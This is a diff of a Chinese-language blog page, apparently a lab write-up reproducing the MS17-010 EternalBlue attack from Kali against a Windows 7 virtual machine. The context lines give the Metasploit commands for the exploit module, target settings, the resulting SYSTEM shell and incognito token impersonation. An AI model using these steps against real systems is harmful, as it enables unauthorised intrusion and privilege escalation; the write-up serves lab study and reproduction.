@@ -21,7 +21,7 @@
 <meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/3.png">
 <meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/4.png">
 <meta property="og:image" content="http://yoursite.com/2018/09/09/essay-ms17010/5.png">
-<meta property="og:updated_time" content="2018-09-10T03:05:23.789Z">
+<meta property="og:updated_time" content="2018-09-10T04:48:37.605Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf中使用ms17010">
 <meta name="twitter:description" content="永恒之蓝已经被爆出很久了，但还是有很多win7机器没有修补漏洞，今天我才使用虚拟机win7和kali进行了复现实验环境：  kali 192.168.59.128  win7 192.168.59.129 （uac关闭）">
@@ -192,6 +192,7 @@
 <a id="more"></a>
 </li>
 </ul>
+<p>准备工作</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># service postgresql start 打开postgresql</span></span><br><span class="line">root@kali:~<span class="comment"># msfconsole 打开msf</span></span><br><span class="line">msf &gt; search eternalblue <span class="comment">#查找永恒之蓝模块</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2018/09/09/essay-ms17010/1.png" alt=""></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue <span class="comment">#使用第三个模块</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show options <span class="comment">#查看配置信息</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOST 192.168.59.129 <span class="comment">#靶机ip</span></span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.59.128 <span class="comment">#攻击机ip</span></span><br></pre></td></tr></table></figure>
@@ -199,7 +200,8 @@
 <p><img src="/2018/09/09/essay-ms17010/3.png" alt=""></p>
 <p>session已建立<br>但在执行reboot命令以及在shell里面运行shutdown命令时失败，错误代码1314（<code>getsystem</code>命令可以一键提权)</p>
 <p><img src="/2018/09/09/essay-ms17010/4.png" alt=""></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid <span class="comment">#查看权限</span></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
+<p>查看一下权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
 <p>令牌伪造</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito <span class="comment">#加载incognito功能</span></span><br><span class="line">meterpreter &gt; list_tokens -u <span class="comment">#列出可用令牌</span></span><br><span class="line">meterpreter &gt; impersonate_token WIN-6LMKOEQAO5E\\r1ngs <span class="comment">#伪造令牌</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2018/09/09/essay-ms17010/5.png" alt=""></p>
@@ -493,11 +495,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
+                <a href="javascript:void(0)" class="js-tag color4">homepage</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">homepage</a>
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
             
             <div class="clearfix"></div>
